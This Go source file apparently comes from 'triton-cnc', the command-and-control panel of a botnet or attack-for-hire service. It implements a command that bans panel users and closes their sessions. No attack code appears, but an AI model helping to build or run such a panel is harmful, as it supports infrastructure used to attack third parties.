package users_edit

import (
	"triton-cnc/core/models/json/build"
	"triton-cnc/core/mysql"
	"triton-cnc/core/sessions/sessions"
	"strconv"
	"strings"
	"time"
)


func BanUser(sessionss *sessions.Session_Store, cmd []string) {

	if len(cmd) <= 2 {
		sessionss.Channel.Write([]byte("\x1b"+build.Config.Extra.DefaultColours+" users                                               Array method is functional\r\n"))
		sessionss.Channel.Write([]byte(" users ban                            Bans multiply users from the cnc/database\r\n"))
		sessionss.Channel.Write([]byte(" users ban [users]              Bans the users listed and closed there sessions\r\n"))
 		sessionss.Channel.Write([]byte(" users ban [users] -m [msg...]         same as last one but sends a msg instead\r\n"))
		return
	}

	var SessionsActive []*sessions.Session_Store; var PassedSplit bool = false; var Message string; var Promotions []bool

	for LenCon := 2; LenCon < len(cmd); LenCon++ {

		if PassedSplit {
			Message += cmd[LenCon] + " "
			continue
		}

		if strings.Contains(cmd[LenCon], "-m") {
			PassedSplit = true
			continue
		}

		User, boolen := database.GetUser(cmd[LenCon])
		if boolen != nil || User == nil {
			sessionss.Channel.Write([]byte("\x1b"+build.Config.Extra.DefaultColours+"User `"+cmd[LenCon]+"` has failed to be found in the database \r\n"))
			continue
		}

		if User.Banned {
			sessionss.Channel.Write([]byte("\x1b"+build.Config.Extra.DefaultColours+"User `"+cmd[LenCon]+"` is already registered as a banned user \r\n"))
			continue
		}

		error := database.EditFeild(cmd[LenCon], "Banned", "1")
		if !error {
			sessionss.Channel.Write([]byte("\x1b"+build.Config.Extra.DefaultColours+"User `"+cmd[LenCon]+"` has failed to be banned from "+build.Config.AppConfig.AppName+"\r\n"))
			continue
		} else {
			Promotions = append(Promotions, true)
		}

		SessionsActive = append(SessionsActive, GetUser(cmd[LenCon])...)

		continue
	}

	for _, s := range SessionsActive {
		s.User.Banned = true
		if PassedSplit {
			go s.Channel.Write([]byte("\x1b[0m\x1b7\x1b[1A\r\x1b[2K \x1b[38;5;1m"+Message+"\x1b[0m\x1b[38;5;15m\x1b8"))
		} else {
			go s.Channel.Write([]byte("\x1b[0m\x1b7\x1b[1A\r\x1b[2K \x1b[38;5;1mYour account has been banned from "+build.Config.AppConfig.AppName+"\x1b[0m\x1b[38;5;15m\x1b8"))
		}

		go func() {
			time.Sleep(5 * time.Second)
			s.Channel.Close()
		}()
	}

	sessionss.Channel.Write([]byte("\x1b[38;5;11m Correctly banned "+strconv.Itoa(len(Promotions))+" users from "+build.Config.AppConfig.AppName+"\r\n"))
	return
}